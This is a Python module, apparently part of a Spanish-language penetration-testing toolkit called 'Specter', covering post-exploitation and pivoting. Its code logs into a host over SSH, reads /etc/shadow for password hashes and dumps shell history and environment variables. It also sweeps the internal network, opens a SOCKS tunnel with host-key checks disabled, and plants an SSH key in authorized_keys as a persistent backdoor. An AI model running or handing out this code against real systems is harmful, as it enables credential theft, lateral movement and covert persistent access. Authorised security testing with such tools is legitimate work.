"""
Specter — Modulo: Post-explotacion y Pivoting
Tecnicas: enumeracion de sistema, usuarios, red interna, SSH pivoting,
extraccion de hashes, persistencia basica.
"""

import os
import socket
from typing import Optional
from pathlib import Path

import paramiko

from utils.helpers import (
    banner, success, info, warning, error,
    run_command, print_table, timestamp, human_timestamp,
    ensure_dir
)
from utils.logger import get_logger
from config import REPORTS_DIR

log = get_logger("post")


# ─── Conexion SSH ─────────────────────────────────────────────────────────────

def ssh_connect(
    host: str,
    port: int = 22,
    username: str = "root",
    password: Optional[str] = None,
    key_path: Optional[str] = None,
) -> Optional[paramiko.SSHClient]:
    """Establece conexion SSH al host comprometido."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if key_path:
            client.connect(host, port=port, username=username, key_filename=key_path, timeout=10)
        else:
            client.connect(host, port=port, username=username, password=password, timeout=10)
        success(f"SSH conectado: {username}@{host}:{port}")
        return client
    except paramiko.AuthenticationException:
        error(f"Autenticacion fallida para {username}@{host}")
    except Exception as e:
        error(f"Error SSH: {e}")
    return None


def ssh_exec(client: paramiko.SSHClient, cmd: str) -> str:
    """Ejecuta un comando via SSH y retorna el output."""
    try:
        _, stdout, stderr = client.exec_command(cmd, timeout=15)
        out = stdout.read().decode(errors="ignore").strip()
        err = stderr.read().decode(errors="ignore").strip()
        return out or err
    except Exception as e:
        return f"Error: {e}"


# ─── Enumeracion del sistema comprometido ────────────────────────────────────

POST_ENUM_CMDS = {
    "hostname":       "hostname",
    "whoami":         "whoami",
    "id":             "id",
    "os":             "uname -a",
    "kernel":         "uname -r",
    "users":          "cat /etc/passwd | grep -v nologin | grep -v false",
    "sudoers":        "sudo -l 2>/dev/null",
    "network":        "ip a 2>/dev/null || ifconfig",
    "routes":         "ip route 2>/dev/null || route -n",
    "arp_table":      "arp -n",
    "listening":      "ss -tlnp 2>/dev/null || netstat -tlnp",
    "processes":      "ps aux --no-headers | head -30",
    "cron":           "crontab -l 2>/dev/null; cat /etc/cron* 2>/dev/null",
    "suid":           "find / -perm -u=s -type f 2>/dev/null",
    "world_writable": "find / -writable -type f 2>/dev/null | grep -v proc | head -20",
    "env_vars":       "env",
    "history":        "cat ~/.bash_history 2>/dev/null | tail -30",
    "ssh_keys":       "ls -la ~/.ssh/ 2>/dev/null",
    "shadow":         "cat /etc/shadow 2>/dev/null",
}


def enumerate_system(client: paramiko.SSHClient) -> dict:
    """Ejecuta comandos de enumeracion y retorna resultados."""
    info("Enumerando sistema comprometido...")
    results = {}
    for key, cmd in POST_ENUM_CMDS.items():
        out = ssh_exec(client, cmd)
        if out and "Permission denied" not in out:
            results[key] = out
            if key in ["hostname", "whoami", "id", "os"]:
                success(f"{key}: {out[:80]}")
    return results


# ─── Extraccion de hashes ─────────────────────────────────────────────────────

def extract_hashes(client: paramiko.SSHClient) -> list[str]:
    """Intenta extraer hashes de /etc/shadow."""
    info("Intentando extraer hashes de /etc/shadow...")
    shadow = ssh_exec(client, "cat /etc/shadow 2>/dev/null")
    if not shadow or "Permission denied" in shadow:
        warning("No se pudo leer /etc/shadow (requiere root).")
        return []
    hashes = [line for line in shadow.splitlines() if ":" in line and not line.startswith("#")]
    success(f"Hashes extraidos: {len(hashes)}")
    return hashes


# ─── Descubrimiento de red interna ────────────────────────────────────────────

def discover_internal_network(client: paramiko.SSHClient) -> list[str]:
    """Hace ping sweep de la red interna desde el host comprometido."""
    info("Descubriendo red interna via ping sweep...")
    # Obtener rango de red
    ifaces = ssh_exec(client, "ip a | grep 'inet ' | grep -v 127")
    alive_hosts = []

    # Usar fping si esta disponible, sino loop de ping
    result = ssh_exec(
        client,
        "fping -a -g $(ip route | grep -v default | awk '{print $1}' | head -1) 2>/dev/null"
    )
    if result:
        alive_hosts = [line.strip() for line in result.splitlines() if line.strip()]
    else:
        # Fallback: ping a .1 a .20 del rango
        sweep = ssh_exec(
            client,
            "for i in $(seq 1 20); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i; done"
        )
        alive_hosts = [line.strip() for line in sweep.splitlines() if line.strip()]

    if alive_hosts:
        success(f"Hosts internos encontrados: {len(alive_hosts)}")
        for h in alive_hosts:
            info(f"  {h}")
    return alive_hosts


# ─── SSH Pivoting / Tunel ─────────────────────────────────────────────────────

def setup_ssh_tunnel(
    jump_host: str,
    jump_user: str,
    jump_pass: str,
    target_host: str,
    target_port: int,
    local_port: int,
) -> None:
    """
    Configura un tunel SSH dinamico (SOCKS proxy) a traves del host comprometido.
    Equivalente a: ssh -D local_port jump_user@jump_host
    """
    info(f"Configurando tunel SSH: localhost:{local_port} → {jump_host} → {target_host}:{target_port}")
    run_command(
        [
            "ssh", "-N", "-D", str(local_port),
            "-o", "StrictHostKeyChecking=no",
            f"{jump_user}@{jump_host}",
        ],
        capture=False,
        timeout=None,
    )


# ─── Persistencia basica ──────────────────────────────────────────────────────

def add_ssh_backdoor(client: paramiko.SSHClient, pub_key: str) -> bool:
    """
    Agrega una clave publica SSH para acceso persistente.
    Solo usar en engagements con scope autorizado.
    """
    info("Agregando backdoor SSH (clave publica)...")
    cmd = f"mkdir -p ~/.ssh && echo '{pub_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
    out = ssh_exec(client, cmd)
    if "Error" not in out:
        success("Clave SSH agregada. Acceso persistente establecido.")
        return True
    error(f"No se pudo agregar la clave SSH: {out}")
    return False


# ─── Reporte ──────────────────────────────────────────────────────────────────

def save_report(target: str, data: dict, hashes: list, hosts: list, output: Optional[str]) -> Path:
    ensure_dir(REPORTS_DIR)
    filename = output or str(REPORTS_DIR / f"post_{target.replace('.', '_')}_{timestamp()}.md")
    path = Path(filename)

    lines = [
        f"# Reporte Post-explotacion — {target}",
        f"**Fecha:** {human_timestamp()}",
        "",
        "## Enumeracion del sistema",
    ]
    for key, val in data.items():
        lines += [f"### {key}", "```", val[:1000], "```", ""]

    if hashes:
        lines += ["## Hashes extraidos", "```"]
        lines += hashes
        lines += ["```", ""]

    if hosts:
        lines += ["## Red interna — Hosts descubiertos", ""]
        for h in hosts:
            lines.append(f"- `{h}`")
        lines.append("")

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


# ─── Punto de entrada ─────────────────────────────────────────────────────────

def run(
    target: Optional[str],
    username: str = "root",
    password: Optional[str] = None,
    key_path: Optional[str] = None,
    verbose: bool = False,
    output: Optional[str] = None,
) -> None:
    if not target:
        error("Debes especificar un objetivo con --target")
        return

    banner("POST — Post-explotacion y Pivoting", f"Objetivo: {target}")

    # Conectar via SSH
    client = ssh_connect(target, username=username, password=password, key_path=key_path)
    if not client:
        warning("No se pudo conectar via SSH. Asegurate de tener credenciales o una sesion activa.")
        return

    try:
        # Enumeracion
        enum_data = enumerate_system(client)

        # Hashes
        hashes = extract_hashes(client)

        # Red interna
        internal_hosts = discover_internal_network(client)

        # Reporte
        report_path = save_report(target, enum_data, hashes, internal_hosts, output)
        success(f"Reporte guardado en: {report_path}")

    finally:
        client.close()
        info("Conexion SSH cerrada.")
